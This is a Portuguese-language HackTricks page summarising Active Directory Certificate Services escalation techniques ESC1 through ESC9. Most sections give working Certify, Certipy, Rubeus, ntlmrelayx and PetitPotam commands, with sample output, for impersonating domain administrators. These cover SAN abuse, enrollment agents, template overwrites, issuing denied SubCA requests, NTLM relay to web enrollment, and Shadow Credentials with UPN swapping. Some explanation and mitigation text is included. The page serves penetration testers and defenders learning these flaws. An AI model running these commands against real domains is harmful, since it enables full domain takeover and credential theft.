# AD CS Escalada de Domínio

{{#include ../../../banners/hacktricks-training.md}}


**Esta é um resumo das seções de técnicas de escalada dos posts:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Misconfigured Certificate Templates - ESC1

### Explicação

### Misconfigured Certificate Templates - ESC1 Explicado

- **Enrolment rights são concedidos a usuários de baixo privilégio pela Enterprise CA.**
- **Aprovação do gerente não é necessária.**
- **Não são necessárias assinaturas de pessoal autorizado.**
- **Os descritores de segurança nos templates de certificado são excessivamente permissivos, permitindo que usuários de baixo privilégio obtenham direitos de enrolment.**
- **Os templates de certificado são configurados para definir EKUs que facilitam a autenticação:**
- Extended Key Usage (EKU) identifiers tais como Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), ou sem EKU (SubCA) estão incluídos.
- **A capacidade de os solicitantes incluírem um subjectAltName no Certificate Signing Request (CSR) é permitida pelo template:**
- O Active Directory (AD) prioriza o subjectAltName (SAN) em um certificado para verificação de identidade, se presente. Isso significa que, especificando o SAN em um CSR, um certificado pode ser solicitado para se passar por qualquer usuário (por exemplo, um administrador de domínio). Se um SAN pode ser especificado pelo solicitante é indicado no objeto AD do template de certificado através da propriedade `mspki-certificate-name-flag`. Essa propriedade é uma máscara de bits, e a presença da flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` permite a especificação do SAN pelo solicitante.

> [!CAUTION]
> A configuração descrita permite que usuários de baixo privilégio solicitem certificados com qualquer SAN à escolha, possibilitando autenticação como qualquer principal do domínio através de Kerberos ou SChannel.

Essa funcionalidade às vezes é ativada para suportar a geração dinâmica de certificados HTTPS ou de host por produtos ou serviços de deployment, ou devido à falta de entendimento.

Observa-se que criar um certificado com essa opção dispara um aviso, o que não acontece quando um template de certificado existente (como o template `WebServer`, que tem `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` ativado) é duplicado e então modificado para incluir um OID de autenticação.

### Abuso

Para **encontrar templates de certificado vulneráveis** você pode executar:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Para **abusar desta vulnerabilidade e se passar por um administrador** pode-se executar:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Então você pode transformar o **certificado gerado para o formato `.pfx`** e usá-lo para **autenticar usando Rubeus ou certipy** novamente:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Os binários do Windows "Certreq.exe" e "Certutil.exe" podem ser usados para gerar o PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

A enumeração de certificate templates dentro do esquema de configuração da floresta do AD, especificamente aqueles que não necessitam de aprovação ou assinaturas, que possuam uma Client Authentication ou Smart Card Logon EKU, e com a flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` habilitada, pode ser realizada executando a seguinte consulta LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Modelos de Certificado Mal Configurados - ESC2

### Explicação

O segundo cenário de abuso é uma variação do primeiro:

1. Direitos de inscrição são concedidos a usuários de baixo privilégio pelo Enterprise CA.
2. O requisito de aprovação do manager está desabilitado.
3. A necessidade de assinaturas autorizadas é omitida.
4. Um descritor de segurança excessivamente permissivo no modelo de certificado concede direitos de inscrição a usuários de baixo privilégio.
5. **O modelo de certificado é definido para incluir o Any Purpose EKU ou no EKU.**

O **Any Purpose EKU** permite que um atacante obtenha um certificado para **qualquer finalidade**, incluindo autenticação de cliente, autenticação de servidor, code signing, etc. A mesma **technique used for ESC3** pode ser empregada para explorar este cenário.

Certificados com **no EKUs**, que atuam como certificados de CA subordinada, podem ser explorados para **qualquer finalidade** e **também podem ser usados para assinar novos certificados**. Assim, um atacante poderia especificar EKUs arbitrários ou campos nos novos certificados utilizando um certificado de CA subordinada.

No entanto, novos certificados criados para **autenticação de domínio** não funcionarão se a CA subordinada não for confiável pelo objeto **`NTAuthCertificates`**, que é a configuração padrão. Mesmo assim, um atacante ainda pode criar **novos certificados com qualquer EKU** e valores arbitrários de certificado. Estes poderiam ser potencialmente **abusados** para uma ampla gama de finalidades (por exemplo, code signing, autenticação de servidor, etc.) e podem ter implicações significativas para outras aplicações na rede como SAML, AD FS, ou IPSec.

Para enumerar templates que correspondem a este cenário dentro do esquema de configuração da floresta AD, a seguinte consulta LDAP pode ser executada:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Misconfigured Enrolment Agent Templates - ESC3

### Explicação

Este cenário é como o primeiro e o segundo, mas **abusando** de um **EKU diferente** (Certificate Request Agent) e **2 templates diferentes** (portanto tem 2 conjuntos de requisitos),

O **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), conhecido como **Enrollment Agent** na documentação da Microsoft, permite que um principal **solicite um certificate** em nome de outro usuário.

O **“enrollment agent”** realiza enrolment em tal **template** e usa o certificado resultante para **co-assinar um CSR em nome do outro usuário**. Em seguida, ele **envia** o **CSR co-assinado** para a CA, inscrevendo-se em um **template** que **permite “enroll on behalf of”**, e a CA responde com um **certificate pertencente ao “outro” usuário**.

**Requirements 1:**

- Direitos de enrollment são concedidos a usuários de baixo privilégio pela Enterprise CA.
- A exigência de aprovação do gerente é omitida.
- Nenhuma exigência de assinaturas autorizadas.
- O security descriptor do certificate template é excessivamente permissivo, concedendo direitos de enrollment a usuários de baixo privilégio.
- O certificate template inclui o Certificate Request Agent EKU, permitindo a requisição de outros certificate templates em nome de outros principals.

**Requirements 2:**

- A Enterprise CA concede direitos de enrollment a usuários de baixo privilégio.
- A aprovação do gerente é contornada.
- A versão do schema do template é ou 1 ou superior a 2, e especifica um Application Policy Issuance Requirement que exige o Certificate Request Agent EKU.
- Um EKU definido no certificate template permite autenticação de domínio.
- Restrições para enrollment agents não são aplicadas na CA.

### Abuse

Você pode usar [**Certify**](https://github.com/GhostPack/Certify) ou [**Certipy**](https://github.com/ly4k/Certipy) para abusar deste cenário:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Os **users** que são permitidos a **obter** um **enrollment agent certificate**, os templates nos quais os **enrollment agents** têm permissão para se inscrever, e as **accounts** em nome das quais o enrollment agent pode agir podem ser restringidos por enterprise CAs. Isso é feito abrindo o snap-in `certsrc.msc`, **clicando com o botão direito na CA**, **clicando Properties**, e então **navegando** até a aba “Enrollment Agents”.

No entanto, observa-se que a configuração **default** para CAs é “**Do not restrict enrollment agents**.” Quando a restrição sobre enrollment agents é habilitada pelos administradores, definindo-a como “Restrict enrollment agents,” a configuração padrão permanece extremamente permissiva. Ela permite que **Everyone** tenha acesso para se inscrever em todos os templates como qualquer usuário.

## Vulnerable Certificate Template Access Control - ESC4

### **Explicação**

O **security descriptor** em **certificate templates** define as **permissions** que **AD principals** específicos possuem em relação ao template.

Caso um **attacker** possua as **permissions** necessárias para **alterar** um **template** e **instituir** quaisquer **exploitable misconfigurations** descritas nas **prior sections**, isso pode facilitar a escalada de privilégios.

Permissões notáveis aplicáveis a certificate templates incluem:

- **Owner:** Grants implicit control over the object, allowing for the modification of any attributes.
- **FullControl:** Enables complete authority over the object, including the capability to alter any attributes.
- **WriteOwner:** Permits the alteration of the object's owner to a principal under the attacker's control.
- **WriteDacl:** Allows for the adjustment of access controls, potentially granting an attacker FullControl.
- **WriteProperty:** Authorizes the editing of any object properties.

### Abuso

Para identificar principals com direitos de edição em templates e outros objetos PKI, enumere com Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Um exemplo de privesc como o anterior:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 é quando um usuário tem privilégios de escrita sobre um modelo de certificado. Isso pode, por exemplo, ser abusado para sobrescrever a configuração do modelo de certificado para tornar o modelo vulnerável ao ESC1.

Como podemos ver no caminho acima, apenas `JOHNPC` possui esses privilégios, mas nosso usuário `JOHN` tem a nova aresta `AddKeyCredentialLink` para `JOHNPC`. Como essa técnica está relacionada a certificados, implementei esse ataque também, que é conhecido como [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Aqui está uma pequena prévia do comando `shadow auto` do Certipy para recuperar o hash NT da vítima.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** pode sobrescrever a configuração de um template de certificado com um único comando. Por **padrão**, Certipy irá **sobrescrever** a configuração para torná-la **vulnerável ao ESC1**. Também podemos especificar o **`-save-old` parâmetro para salvar a configuração antiga**, que será útil para **restaurar** a configuração após nosso ataque.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Controle de Acesso a Objetos PKI Vulnerável - ESC5

### Explicação

A extensa teia de relacionamentos interconectados baseados em ACL, que inclui vários objetos além de certificate templates e the certificate authority, pode impactar a segurança de todo o sistema AD CS. Esses objetos, que podem afetar significativamente a segurança, englobam:

- O objeto de computador AD do servidor CA, que pode ser comprometido por meio de mecanismos como S4U2Self ou S4U2Proxy.
- O servidor RPC/DCOM do servidor CA.
- Qualquer objeto AD descendente ou container dentro do caminho de container específico `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Este caminho inclui, entre outros, containers e objetos como o Certificate Templates container, Certification Authorities container, o NTAuthCertificates object, e o Enrollment Services Container.

A segurança do sistema PKI pode ser comprometida se um atacante com baixos privilégios conseguir assumir o controle de qualquer um desses componentes críticos.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explicação

O assunto discutido no [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) também aborda as implicações da flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, conforme descrito pela Microsoft. Essa configuração, quando ativada em uma Autoridade Certificadora (CA), permite a inclusão de **valores definidos pelo usuário** no **nome alternativo do assunto** para **qualquer requisição**, incluindo aquelas construídas a partir do Active Directory®. Consequentemente, essa provisão permite que um **intruso** se registre através de **qualquer template** configurado para **autenticação** de domínio—especificamente aqueles abertos para inscrição de usuários **sem privilégios**, como o template padrão User. Como resultado, um certificado pode ser obtido, permitindo que o intruso autentique-se como um administrador de domínio ou **qualquer outra entidade ativa** dentro do domínio.

**Nota**: A abordagem para anexar **nomes alternativos** em um Certificate Signing Request (CSR), por meio do argumento `-attrib "SAN:"` no `certreq.exe` (referido como “Name Value Pairs”), apresenta um **contraste** com a estratégia de exploração de SANs em ESC1. Aqui, a distinção reside em **como a informação da conta é encapsulada**—dentro de um atributo do certificado, em vez de uma extensão.

### Abuso

Para verificar se a configuração está ativada, as organizações podem utilizar o seguinte comando com `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Esta operação essencialmente emprega **remote registry access**, portanto, uma abordagem alternativa pode ser:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Ferramentas como [**Certify**](https://github.com/GhostPack/Certify) e [**Certipy**](https://github.com/ly4k/Certipy) são capazes de detectar essa misconfiguração e explorá-la:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Para alterar essas configurações, supondo que se possua direitos de **administrador do domínio** ou equivalentes, o seguinte comando pode ser executado a partir de qualquer estação de trabalho:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Para desativar essa configuração no seu ambiente, a flag pode ser removida com:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Após as atualizações de segurança de maio de 2022, os **certificados** recém-emitidos conterão uma **extensão de segurança** que incorpora a **propriedade `objectSid` do solicitante**. Para ESC1, esse SID é derivado do SAN especificado. No entanto, para **ESC6**, o SID espelha o **`objectSid` do solicitante**, não o SAN.\
> Para explorar ESC6, é essencial que o sistema seja suscetível a ESC10 (Weak Certificate Mappings), que prioriza o **SAN sobre a nova extensão de segurança**.

## Controle de Acesso de Autoridade de Certificação Vulnerável - ESC7

### Ataque 1

#### Explicação

O controle de acesso para uma autoridade de certificação é mantido por meio de um conjunto de permissões que governam as ações da CA. Essas permissões podem ser visualizadas acessando `certsrv.msc`, clicando com o botão direito em uma CA, selecionando propriedades e, em seguida, navegando até a aba Segurança. Além disso, as permissões podem ser enumeradas usando o módulo PSPKI com comandos como:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Isto fornece informações sobre os direitos primários, a saber **`ManageCA`** e **`ManageCertificates`**, correspondendo respectivamente aos papéis de “administrador de CA” e “Gerente de Certificados”.

#### Abuso

Ter direitos **`ManageCA`** em uma autoridade certificadora permite que o principal manipule configurações remotamente usando PSPKI. Isso inclui alternar a flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`** para permitir a especificação de SAN em qualquer template, um aspecto crítico da domain escalation.

A simplificação desse processo pode ser alcançada por meio do cmdlet **Enable-PolicyModuleFlag** do PSPKI, permitindo modificações sem interação direta com a GUI.

A posse dos direitos **`ManageCertificates`** facilita a aprovação de solicitações pendentes, contornando efetivamente a salvaguarda "CA certificate manager approval".

Uma combinação dos módulos **Certify** e **PSPKI** pode ser utilizada para solicitar, aprovar e baixar um certificado:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attack 2

#### Explanation

> [!WARNING]
> No **ataque anterior** as permissões **`Manage CA`** foram usadas para **habilitar** a flag **EDITF_ATTRIBUTESUBJECTALTNAME2** para realizar o ataque **ESC6**, mas isso não terá efeito até que o serviço CA (`CertSvc`) seja reiniciado. Quando um usuário tem o direito de acesso `Manage CA`, ele também tem permissão para **reiniciar o serviço**. No entanto, isso **não significa que o usuário possa reiniciar o serviço remotamente**. Além disso, o **ESC6 pode não funcionar por padrão** na maioria dos ambientes atualizados devido às atualizações de segurança de maio de 2022.

Portanto, outro ataque é apresentado aqui.

Perquisites:

- Apenas a permissão **`ManageCA`**
- Permissão **`Manage Certificates`** (pode ser concedida por **`ManageCA`**)
- O template de certificado **`SubCA`** deve estar **habilitado** (pode ser habilitado por **`ManageCA`**)

A técnica baseia-se no fato de que usuários com os direitos de acesso `Manage CA` _e_ `Manage Certificates` podem **emitir solicitações de certificado com falha**. O template de certificado **`SubCA`** é **vulnerável ao ESC1**, mas **apenas administradores** podem se inscrever no template. Assim, um **usuário** pode **solicitar** inscrição no **`SubCA`** — que será **negada** — mas **então emitida pelo manager posteriormente**.

#### Abuse

Você pode **conceder a si mesmo o direito de acesso `Manage Certificates`** adicionando seu usuário como um novo officer.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
O modelo **`SubCA`** pode ser **habilitado na CA** com o parâmetro `-enable-template`. Por padrão, o modelo `SubCA` está habilitado.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Se tivermos cumprido os pré-requisitos para este ataque, podemos começar por **solicitar um certificado com base no template `SubCA`**.

**Esta solicitação será negada**, mas vamos salvar a chave privada e anotar o ID da requisição.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Com nossos **`Manage CA` e `Manage Certificates`**, podemos então **emitir a solicitação de certificado falhada** com o comando `ca` e o parâmetro `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
E, finalmente, podemos **recuperar o certificado emitido** com o comando `req` e o parâmetro `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Ataque 3 – Abuso da extensão Manage Certificates (SetExtension)

#### Explicação

Além dos abusos clássicos do ESC7 (ativar atributos EDITF ou aprovar solicitações pendentes), **Certify 2.0** revelou uma primitiva totalmente nova que requer apenas a permissão *Manage Certificates* (também conhecida como **Certificate Manager / Officer**) na Enterprise CA.

O método RPC `ICertAdmin::SetExtension` pode ser executado por qualquer principal que possua *Manage Certificates*. Enquanto o método era tradicionalmente usado por CAs legítimas para atualizar extensões em solicitações **pendentes**, um atacante pode abusá-lo para **acrescentar uma extensão de certificado *não padrão*** (por exemplo, um OID customizado de *Certificate Issuance Policy* como `1.1.1.1`) a uma solicitação que está aguardando aprovação.

Como o template alvo **não define um valor padrão para essa extensão**, a CA NÃO sobrescreverá o valor controlado pelo atacante quando a solicitação for finalmente emitida. O certificado resultante, portanto, contém uma extensão escolhida pelo atacante que pode:

* Satisfazer requisitos de Application / Issuance Policy de outros templates vulneráveis (levando à escalada de privilégios).
* Injetar EKUs ou policies adicionais que concedam ao certificado confiança inesperada em sistemas de terceiros.

Em suma, *Manage Certificates* — anteriormente considerado a “metade menos poderosa” do ESC7 — agora pode ser aproveitado para escalada completa de privilégios ou persistência de longo prazo, sem mexer na configuração da CA ou exigir o direito mais restrito *Manage CA*.

#### Abusando da primitiva com Certify 2.0

1. **Submit a certificate request that will remain *pending*.**  This can be forced with a template that requires manager approval:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Append a custom extension to the pending request** using the new `manage-ca` command:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Se o template não definir já a extensão *Certificate Issuance Policies*, o valor acima será preservado após a emissão.*

3. **Issue the request** (if your role also has *Manage Certificates* approval rights) or wait for an operator to approve it.  Once issued, download the certificate:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. O certificado resultante agora contém o OID malicioso de issuance-policy e pode ser usado em ataques subsequentes (por exemplo ESC13, escalada de domínio, etc.).

> NOTE:  The same attack can be executed with Certipy ≥ 4.7 through the `ca` command and the `-set-extension` parameter.

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Explicação

> [!TIP]
> Em ambientes onde **AD CS está instalado**, se existir um **web enrollment endpoint vulnerável** e pelo menos um **certificate template publicado** que permita **domain computer enrollment and client authentication** (como o template padrão **`Machine`**), torna-se possível que **qualquer computador com o spooler service ativo seja comprometido por um atacante**!

Vários **métodos de enrollment baseados em HTTP** são suportados pelo AD CS, disponibilizados através de funções de servidor adicionais que os administradores podem instalar. Essas interfaces para enrollment de certificados via HTTP são suscetíveis a **NTLM relay attacks**. Um atacante, a partir de uma **máquina comprometida, pode se passar por qualquer conta AD que autentique via NTLM inbound**. Enquanto se passa pela conta vítima, essas interfaces web podem ser acessadas pelo atacante para **solicitar um certificado de client authentication usando os templates de certificado `User` ou `Machine`**.

- A **web enrollment interface** (uma aplicação ASP mais antiga disponível em `http://<caserver>/certsrv/`), por padrão usa apenas HTTP, o que não oferece proteção contra NTLM relay attacks. Adicionalmente, ela permite explicitamente apenas autenticação NTLM através do cabeçalho Authorization HTTP, tornando métodos de autenticação mais seguros como Kerberos inaplicáveis.
- O **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service, e o **Network Device Enrollment Service** (NDES) por padrão suportam authenticate negotiate via seu cabeçalho Authorization HTTP. Negotiate authentication **suporta tanto** Kerberos quanto **NTLM**, permitindo que um atacante **rebaixe para NTLM** durante ataques de relay. Embora esses web services habilitem HTTPS por padrão, HTTPS por si só **não protege contra NTLM relay attacks**. A proteção contra NTLM relay attacks para serviços HTTPS só é possível quando o HTTPS é combinado com channel binding. Infelizmente, o AD CS não ativa Extended Protection for Authentication no IIS, que é necessária para channel binding.

Um problema comum com NTLM relay attacks é a **curta duração das sessões NTLM** e a incapacidade do atacante de interagir com serviços que **exigem NTLM signing**.

No entanto, essa limitação é contornada explorando um NTLM relay attack para adquirir um certificado para o usuário, já que o período de validade do certificado dita a duração da sessão, e o certificado pode ser usado com serviços que **exigem NTLM signing**. Para instruções sobre como usar um certificado roubado, consulte:


{{#ref}}
account-persistence.md
{{#endref}}

Outra limitação dos NTLM relay attacks é que **uma máquina controlada pelo atacante deve ser autenticada por uma conta vítima**. O atacante pode esperar ou tentar **forçar** essa autenticação:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuso**

O `cas` do [**Certify**](https://github.com/GhostPack/Certify) enumera **endpoints HTTP do AD CS habilitados**:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

A propriedade `msPKI-Enrollment-Servers` é usada por Autoridades de Certificação empresariais (CAs) para armazenar endpoints do Certificate Enrollment Service (CES). Esses endpoints podem ser analisados e listados utilizando a ferramenta **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Abuso com Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Abuso com [Certipy](https://github.com/ly4k/Certipy)

O Certipy solicita um certificado por padrão com base no template `Machine` ou `User`, determinado pelo fato de o nome da conta que está sendo encaminhada terminar com `$`. A especificação de um template alternativo pode ser feita usando o parâmetro `-template`.

Uma técnica como [PetitPotam](https://github.com/ly4k/PetitPotam) pode então ser empregada para forçar a autenticação. Ao lidar com controladores de domínio, é necessária a especificação de `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Sem Extensão de Segurança - ESC9 <a href="#id-5485" id="id-5485"></a>

### Explicação

O novo valor **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) para **`msPKI-Enrollment-Flag`**, referido como ESC9, impede a inclusão da **nova extensão de segurança `szOID_NTDS_CA_SECURITY_EXT`** em um certificado. Essa flag torna-se relevante quando `StrongCertificateBindingEnforcement` está definido como `1` (configuração padrão), em contraste com o valor `2`. Sua relevância aumenta em cenários onde um certificate mapping mais fraco para Kerberos ou Schannel possa ser explorado (como em ESC10), já que a ausência do ESC9 não alteraria os requisitos.

As condições em que a configuração dessa flag se torna significativa incluem:

- `StrongCertificateBindingEnforcement` não está ajustado para `2` (sendo `1` o padrão), ou `CertificateMappingMethods` inclui a flag `UPN`.
- O certificado está marcado com a flag `CT_FLAG_NO_SECURITY_EXTENSION` dentro da configuração `msPKI-Enrollment-Flag`.
- Qualquer EKU de autenticação de cliente é especificado pelo certificado.
- Permissões `GenericWrite` estão disponíveis sobre alguma conta, permitindo comprometer outra.

### Cenário de Abuso

Suponha que `John@corp.local` tenha permissões `GenericWrite` sobre `Jane@corp.local`, com o objetivo de comprometer `Administrator@corp.local`. O template de certificado `ESC9`, no qual `Jane@corp.local` tem permissão para se inscrever, está configurado com a flag `CT_FLAG_NO_SECURITY_EXTENSION` em sua configuração `msPKI-Enrollment-Flag`.

Inicialmente, o hash da `Jane` é obtido usando Shadow Credentials, graças ao `GenericWrite` de `John`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Em seguida, o `userPrincipalName` de `Jane` é modificado para `Administrator`, omitindo propositalmente a parte do domínio `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Esta modificação não viola as restrições, dado que `Administrator@corp.local` permanece distinto como o `userPrincipalName` do `Administrator`.

Em seguida, o template de certificado `ESC9`, marcado como vulnerável, é solicitado como `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Observa-se que o `userPrincipalName` do certificado reflete `Administrator`, desprovido de qualquer “object SID”.

O `userPrincipalName` de `Jane` é então revertido ao original, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Tentar autenticar com o certificado emitido agora produz o NT hash de `Administrator@corp.local`. O comando deve incluir `-domain <domain>` devido à ausência de especificação de domínio no certificado:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
